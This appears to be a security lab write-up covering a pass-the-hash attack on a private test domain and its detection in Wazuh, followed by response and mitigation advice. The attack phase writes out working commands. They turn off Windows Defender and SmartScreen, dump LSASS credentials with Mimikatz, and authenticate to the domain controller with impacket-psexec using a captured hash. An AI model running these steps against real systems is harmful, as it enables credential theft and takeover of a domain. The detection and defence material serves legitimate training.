# Lab 06 - Pass-the-Hash Attack and Detection

**Category:** Offensive Security + Detection Engineering  
**Difficulty:** Intermediate-Advanced  
**Attacker:** Kali Linux (`10.0.0.117`)  
**Credential Source:** WS01 (`10.0.0.201`)  
**Target:** DC01 - lab.local domain controller (`10.0.0.200`)  
**SIEM:** Wazuh Manager (`10.0.0.166`)  
**MITRE ATT&CK:** T1550.002 - Pass the Hash, T1003.001 - LSASS Memory, T1021.002 - SMB/Windows Admin Shares  
**Date:** April 2026

---

## Overview

Extracted NTLM credentials from memory on a domain-joined workstation using Mimikatz, then used those hashes to authenticate to the domain controller without knowing the plaintext password. Wazuh detected the attack using two built-in rules that together tell the full lateral movement story.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Mimikatz | Credential dumping from LSASS memory on WS01 |
| Impacket psexec | Pass-the-Hash authentication to DC01 |
| Wazuh SIEM | Detection via Windows Event ID 4624 and 7045 |

---

## Background

Windows never stores or transmits passwords in plaintext. Instead it uses NTLM hashes for authentication. The critical flaw in NTLM is that the hash itself is sufficient for authentication. You never need the actual password.

Pass-the-Hash exploits this directly. Once an attacker has an NTLM hash from any source, they can authenticate to other systems using that hash as if it were a password. No cracking required, no brute force, just passing the hash straight to the target.

```
Attacker compromises WS01
    -> Mimikatz dumps NTLM hashes from LSASS memory
    -> Domain Administrator hash captured
    -> Hash passed to DC01 via Impacket
    -> DC01 authenticates it -> full domain access
```

This is particularly dangerous because password rotation does not help if the attacker still has the hash. The hash remains valid until the underlying password actually changes. It also enables instant lateral movement since the same administrator hash often works across multiple systems in the domain.

---

## Attack Chain

```
Phase 1: Credential Dumping on WS01
    -> Mimikatz reads LSASS memory
    -> Domain Administrator NTLM hash extracted

Phase 2: Lateral Movement from Kali to DC01
    -> Impacket psexec passes hash
    -> ADMIN$ share accessed
    -> Service binary uploaded and executed

Phase 3: Detection on Wazuh
    -> Rule 92652: NTLM remote logon flagged as possible PtH
    -> Rule 92650: Suspicious service creation via Admin shares
```

---

## Phase 1 - Credential Dumping with Mimikatz

Windows Defender flags Mimikatz as a hack tool so it had to be disabled first:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name SmartScreenEnabled -Value "Off"
```

Downloaded Mimikatz from the official GitHub repository and extracted it to WS01, then ran it from the x64 directory:

```powershell
cd C:\Users\Administrator\Downloads\mimikatz\x64
.\mimikatz.exe
```

At the Mimikatz prompt, elevated to debug privilege and dumped all cached credentials from LSASS memory:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

The domain Administrator credential was cached in LSASS because that account had been used to log into WS01:

```
User Name    : Administrator
Domain       : LAB
Logon Server : DC01
NTLM         : a8eef4239164a2991f11a471475e8a4f
```

The `Logon Server: DC01` confirms this is the domain Administrator account, not the local machine account. This hash gives access to every system in lab.local.

---

## Phase 2 - Pass-the-Hash with Impacket

Used Impacket psexec to authenticate to DC01 using the captured hash:

```bash
impacket-psexec Administrator@10.0.0.200 -hashes aad3b435b51404eeaad3b435b51404ee:a8eef4239164a2991f11a471475e8a4f
```

The `aad3b435b51404eeaad3b435b51404ee` portion is the empty LM hash which is standard on modern Windows. The actual NTLM hash follows after the colon.

Impacket output:

```
[*] Requesting shares on 10.0.0.200
[*] Found writable share ADMIN$
[*] Uploading file yeeZCNFB.exe
[*] Opening SVCManager on 10.0.0.200
[*] Creating service anKl on 10.0.0.200
[*] Starting service anKl
```

The authentication worked. DC01 accepted the hash and granted access to ADMIN$. Impacket then uploaded a service binary and created a Windows service for remote execution. The hash alone was enough to get full administrative access to the domain controller.

---

## Phase 3 - Detection

Wazuh caught the attack using two built-in rules that fired within the same second.

### Rule 92652 - Pass-the-Hash Authentication

```
rule.id:           92652
rule.level:        6
rule.description:  Successful Remote Logon Detected - User:\Administrator
                   - NTLM authentication, possible pass-the-hash attack.
rule.mitre.id:     T1550.002, T1078.002
rule.mitre.tactic: Lateral Movement, Defense Evasion

agent.name:                                    DC01
data.win.eventdata.authenticationPackageName:  NTLM
data.win.eventdata.lmPackageName:              NTLM V2
data.win.eventdata.logonType:                  3
data.win.eventdata.ipAddress:                  10.0.0.117
data.win.eventdata.targetDomainName:           LAB
timestamp:                                     2026-04-27T19:14:12Z
```

Wazuh flagged this because the authentication used NTLM instead of Kerberos, which is the normal domain authentication method. Logon Type 3 indicates a remote network logon, and NTLM V2 on a remote network logon from an unexpected IP is a known Pass-the-Hash indicator.

### Rule 92650 - Psexec Service Creation

```
rule.id:           92650
rule.level:        12 (Critical)
rule.description:  New Windows Service Created to start from windows root path.
                   Suspicious event as the binary may have been dropped using
                   Windows Admin Shares.
rule.mitre.id:     T1021.002, T1569.002
rule.mitre.tactic: Lateral Movement, Execution

data.win.eventdata.serviceName:  anKl
data.win.eventdata.imagePath:    %systemroot%\yeeZCNFB.exe
data.win.eventdata.accountName:  LocalSystem
data.win.system.eventID:         7045
timestamp:                       2026-04-27T19:14:12Z
```

The random service name and binary name running from %systemroot% as LocalSystem are classic Impacket psexec signatures. Wazuh correctly identified this as a suspicious service dropped via Admin shares.

### Two-Alert Chain

Together the two alerts paint a complete picture. Rule 92652 shows an NTLM remote logon from Kali, and Rule 92650 shows a suspicious service appearing on DC01 a split second later. An analyst seeing both of these together has everything needed to understand what happened: Pass-the-Hash authentication followed by remote code execution via psexec.

---

## Detection Summary

| Indicator | Value |
|-----------|-------|
| Attack Type | Pass-the-Hash + Lateral Movement |
| Attacker IP | 10.0.0.117 (Kali Linux) |
| Credential Source | WS01 LSASS memory |
| Hash Used | Domain Administrator NTLM |
| Target | DC01 (10.0.0.200) |
| Auth Package | NTLM V2 |
| Logon Type | 3 (Network) |
| Detection Rules | 92652 (Level 6), 92650 (Level 12) |
| MITRE Techniques | T1550.002, T1003.001, T1021.002, T1569.002 |
| Time to Detect | Under 30 seconds |

---

## Incident Response

The attacker IP (10.0.0.117) needs to be isolated immediately. Because the domain Administrator hash was used, this is a domain-wide compromise, not just an isolated machine incident. The domain Administrator password needs to be changed, and the KRBTGT password should be rotated twice to invalidate any Kerberos tickets that may have been issued during the attack window.

From there the investigation should expand outward. Check for other systems the attacker may have accessed using the same hash by looking for Event ID 4624 logon type 3 with NTLM from 10.0.0.117 across all Wazuh agents. Look for scheduled tasks, registry run keys, or new local accounts that may have been created for persistence. And trace back to WS01 to figure out how the attacker got there in the first place.

---

## Defensive Recommendations

The most effective mitigations work at the credential layer. Enabling the Protected Users security group for privileged accounts prevents NTLM authentication entirely for those accounts, which eliminates Pass-the-Hash as an attack vector against them. Microsoft Credential Guard uses virtualization-based security to prevent LSASS from being read, which stops Mimikatz from extracting the hashes in the first place.

LSA Protection (RunAsPPL registry setting) also prevents Mimikatz from reading LSASS memory and is easier to deploy than full Credential Guard.

The tiered administration model would have prevented this specific attack path. If domain admins never log into workstations, their hashes never get cached on WS01 and there is nothing for Mimikatz to find. That single architectural control removes an entire class of lateral movement attacks.

---

## References

- [MITRE ATT&CK T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [MITRE ATT&CK T1003.001 - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [MITRE ATT&CK T1021.002 - SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Microsoft - Protecting Credentials with Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
- [Microsoft - Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
